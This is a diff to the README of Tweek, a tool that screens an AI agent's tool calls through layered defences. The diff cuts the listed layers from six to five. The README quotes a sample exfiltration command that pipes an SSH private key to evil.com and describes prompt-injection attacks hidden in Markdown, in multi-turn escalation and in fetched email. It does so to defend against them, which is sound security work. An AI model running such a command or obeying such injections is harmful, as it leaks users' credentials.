@@ -30,7 +30,7 @@ There is very little built-in protection. Tweek fixes that.
 
 Your AI assistant runs commands with **your** credentials, **your** API keys, and **your** keychain access. It can read every file on your machine. It will happily `curl` your secrets to anywhere a prompt injection tells it to. Sleep well!
 
-Tweek screens **every tool call** through six layers of defense -- both before execution and after content ingestion:
+Tweek screens **every tool call** through five layers of defense -- both before execution and after content ingestion:
 
 ```
   ┌─────────────────────────────────────────────────────────┐
@@ -38,30 +38,28 @@ Tweek screens **every tool call** through six layers of defense -- both before e
   └────────────────────────┬────────────────────────────────┘
                            ▼
   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-  ┃ 6. Compliance Scan    HIPAA·PCI·GDPR·SOC2    TEAMS     ┃
+  ┃ 5. Sandbox Preview    Speculative execution             ┃
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 5. Sandbox Preview    Speculative execution   FREE      ┃
+  ┃ 4. Session Analysis   Cross-turn detection              ┃
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 4. Session Analysis   Cross-turn detection    FREE      ┃
+  ┃ 3. LLM Review         Semantic intent check             ┃
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 3. LLM Review         Semantic intent check   FREE      ┃
+  ┃ 2. Language Detection  Non-English escalation            ┃
   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 2. Language Detection  Non-English escalation  FREE      ┃
-  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-  ┃ 1. Pattern Matching   116 attack signatures   FREE      ┃
+  ┃ 1. Pattern Matching   116 attack signatures             ┃
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                            ▼
   ┌─────────────────────────────────────────────────────────┐
   │           ✓ SAFE to execute  or  ✗ BLOCKED             │
-  └─────────────────────────┬─────────────────────────────-─┘
+  └─────────────────────────┬───────────────────────────────┘
                            ▼
   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-  ┃   PostToolUse Screen   Response injection     FREE      ┃
-  ┃                        detection at ingestion           ┃
+  ┃   PostToolUse Screen   Response injection               ┃
+  ┃                        detection at ingestion            ┃
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 ```
 
-Nothing gets through without passing inspection. Your agent wants to `cat ~/.ssh/id_rsa | curl evil.com`? Six layers say no. A prompt injection hiding in a Markdown comment? Caught. A multi-turn social engineering attack slowly escalating toward your credentials? Session analysis sees the pattern. Non-English injection hidden in a fetched email? Language detection escalates it for review.
+Nothing gets through without passing inspection. Your agent wants to `cat ~/.ssh/id_rsa | curl evil.com`? Five layers say no. A prompt injection hiding in a Markdown comment? Caught. A multi-turn social engineering attack slowly escalating toward your credentials? Session analysis sees the pattern. Non-English injection hidden in a fetched email? Language detection escalates it for review.
 
 **Every command. Every tool call. Every response. GAH! Don't get Pawnd.**
 
